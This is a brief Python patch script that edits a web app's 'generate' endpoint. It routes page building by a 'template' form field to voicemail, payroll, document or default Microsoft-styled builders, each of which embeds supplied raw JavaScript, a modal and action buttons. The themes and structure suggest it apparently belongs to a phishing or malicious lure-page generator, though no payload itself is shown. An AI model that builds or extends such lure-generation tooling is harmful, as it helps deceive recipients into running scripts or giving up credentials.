# Now update the generate endpoint to accept template parameter and use the right builder
# Find where it builds the page variable and add template routing
old_page_start = "    page = f'''<!DOCTYPE html><html"
new_page_start = """    template = request.form.get('template', 'microsoft')

    if template == 'voicemail':
        page = build_voicemail_template(raw_js, use_modal, modal_css, modal_html, action_btn, wait_text, wait_btn)
    elif template == 'payroll':
        page = build_payroll_template(raw_js, use_modal, modal_css, modal_html, action_btn, wait_text, wait_btn)
    elif template == 'document':
        page = build_document_template(raw_js, use_modal, modal_css, modal_html, action_btn, wait_text, wait_btn)
    else:
        page = f\'\'\'<!DOCTYPE html><html"""

content = content.replace(old_page_start, new_page_start)

